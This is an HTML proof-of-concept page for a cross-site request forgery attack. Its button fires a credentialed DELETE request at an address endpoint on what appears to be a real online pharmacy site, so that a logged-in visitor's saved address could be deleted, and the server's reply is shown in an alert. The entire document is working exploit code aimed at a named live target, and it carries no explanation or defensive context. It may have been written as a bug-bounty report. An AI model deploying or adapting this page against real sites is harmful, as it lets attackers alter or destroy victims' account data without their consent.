<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - DELETE Request</title>
</head>
<body>
  <h1>CSRF PoC - Real DELETE Request</h1>
  <p>Click the button below to send a DELETE request to the target API.</p>

  <button onclick="sendDelete()">Send DELETE</button>

  <script>
    function sendDelete() {
      fetch("https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947", {
        method: "DELETE",
        credentials: "include", // important for sending cookies
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        }
      })
      .then(res => res.text())
      .then(data => {
        alert("Response:\n" + data);
      })
      .catch(err => {
        alert("Error:\n" + err);
      });
    }
  </script>
</body>
</html>
